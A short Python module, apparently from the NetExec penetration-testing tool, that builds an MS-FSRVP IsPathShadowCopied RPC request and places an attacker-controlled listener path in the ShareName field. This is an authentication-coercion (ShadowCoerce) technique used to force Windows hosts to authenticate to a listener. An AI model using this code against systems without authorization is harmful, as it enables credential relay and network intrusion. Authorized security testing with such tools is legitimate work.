from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


class IsPathShadowCopied(NDRCALL):
    """Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol"""
    opnum = 9
    structure = (
        ("ShareName", WSTR),  # Type: LPWSTR
    )


class IsPathShadowCopiedResponse(NDRCALL):
    """Structure to parse the response of the RPC call to IsPathShadowCopied() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
    structure = ()


def request(dce, listener):
    request = IsPathShadowCopied()
    request["ShareName"] = f"{listener}\x00"
    dce.request(request)